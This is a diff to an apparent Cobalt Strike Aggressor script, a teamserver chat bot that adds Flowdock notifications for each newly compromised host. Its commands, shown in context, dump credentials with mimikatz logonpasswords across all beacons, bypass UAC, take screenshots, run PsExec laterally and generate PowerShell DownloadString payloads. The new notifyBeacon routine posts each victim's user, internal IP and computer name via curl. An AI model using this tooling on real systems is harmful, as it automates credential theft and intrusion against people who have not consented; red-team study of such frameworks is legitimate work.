@@ -7,6 +7,11 @@
 # - PsExec from the event log
 # - Automatically bypass UAC
 # - Screenshot all beacons
+# - Post new beacon notifications to Flowdock
+
+global('$notify');
+
+$notify = 0;
 
 # PsExec against $target from $bid
 # TODO figure out how to use with make_token
@@ -82,6 +87,7 @@ sub createDownloadString {
     }
 }
 
+# Get Windows version and set the Beacon note
 sub getVersion {
     local ('$bid $version $winver');
 
@@ -107,12 +113,42 @@ sub getVersion {
     bnote($bid, "OS: $winver");
 }
 
+# Send Flowdock notification on a new Beacon
+sub notifyBeacon {
+    local ('$bid $bUser $bIntIP $bName $msg @cmd $url');
+
+    $bid = $1;
+    $bUser = binfo($bid, 'user');
+    $bIntIP = binfo($bid, 'host');
+    $bName = binfo($bid, 'computer');
+
+    # Text file with Flowdock URL containing API key for authentication
+    $url = readln(openf("CHANGEME.TXT"));
+    println($url);
+
+    $msg = " @team New Beacon: " . $bUser . "@" . $bIntIP . " (". $bName . ")";
+    println($msg);
+
+    # Codename to tag message with
+    $codename = "GREENBEAN";
+
+    # Build our curl command
+    @cmd = @('curl', '-X', 'POST', '-F', 'event=message', '-F', 'content=' . $msg, '-F', 'tags=C2,' . $codename, $url);
+    println(@cmd);
+
+    # Run our curl command and get the output
+    println(readAll(exec(@cmd)));
+}
+
+# Triggered whenever user joins the teamserver
 on event_join {
+    # Welcome them!
     elog("User \c9$1\c7 joined! Welcome to the teamserver.");
 }
 
+# Triggered on all public events in the event log
 on event_public {
-    if (substr($2, 0, 1) eq "!") {
+    if (substr($2, 0, 1) eq "!") { # If first character is !, it's a command
         @input = split(" ", $2); # Split incoming command on spaces
         $cmd = @input[0]; # Command is !<cmd> arg1 arg2...
         @args = sublist(@input, 1); # sublist gets everything after !cmd
@@ -120,7 +156,7 @@ on event_public {
         # Log to script console for debug purposes
         println("Command received: $cmd");
         println("Arguments: " . @args);
-
+        # Play ping pong
         if ($cmd eq "!ping") {
             say("pong!");
         }
@@ -176,18 +212,37 @@ on event_public {
                 createDownloadString($listener);
             }
         }
-        else if ($cmd eq "!checkin") {
-            foreach $b (beacons()){
-                bcheckin($b['id']);
-                sleep(1000);
-            }
-        }
+        # Run logonpasswords on all Beacons
         else if ($cmd eq "!mimikatz") {
             foreach $b (beacons()) {
                 blogonpasswords($b['id']);
                 sleep(1000);
             }
         }
+        else if ($cmd eq "!notify") {
+            if (!@args) {
+                if ($notify == 1) {
+                    elog("Notifications: \c9ON\o");
+                }
+                else {
+                    elog("Notifications: \c4OFF\o");
+                }
+            }
+            else {
+                if (@args[0] eq "on") {
+                    $notify = 1;
+                    elog("Notifications turned \c9ON\o");
+                }
+                else if (@args[0] eq "off") {
+                    $notify = 0;
+                    elog("Notifications turned \c4OFF\o");
+                }
+                else {
+                    say("Please choose \c9on\o or \c4off\o");
+                }
+            }
+        }
+        # Get help.
         else if ($cmd eq "!help") {
             say("Beep boop! Here are my commands:");
             say("ping:\t\t\tPong!");
@@ -197,13 +252,15 @@ on event_public {
             say("elevate:\t\t\tAttempt to bypass UAC on all non-admin beacons.");
             say("screenshot:\t\t\tAttempt to screenshot all beacons.");
             say("downloadstring:\t\t\tGet a Powershell DownloadString payload.");
-            say("checkin:\t\t\tAsk all beacons to checkin.");
             say("mimikatz:\t\t\tTask all beacons to run logonpasswords.");
+            say("notify:\t\t\tSend notifications to Flowdock for all new Beacons.");
         }
     }
 }
 
 on beacon_initial {
+    local('$b');
+    global('$notify');
     # If incoming beacon is admin, call it out in event log
     if (-isadmin $1) {
         # $1 for beacon_initial event is beacon ID, have to get metadata with bdata($1)
@@ -211,7 +268,13 @@ on beacon_initial {
         say("\c5New admin beacon: \c2" . $b['user'] . "@" . $b['computer'] . "\c5!");
     }
 
+    # Get Windows version and set Beacon note.
     getVersion($1);
+
+    # If notifications are turned on, notify when we get a new beacon
+    if ($notify == 1) {
+        notifyBeacon($1);
+    }
 }
 
 # Log all beacon tasks to event log for debugging purposes
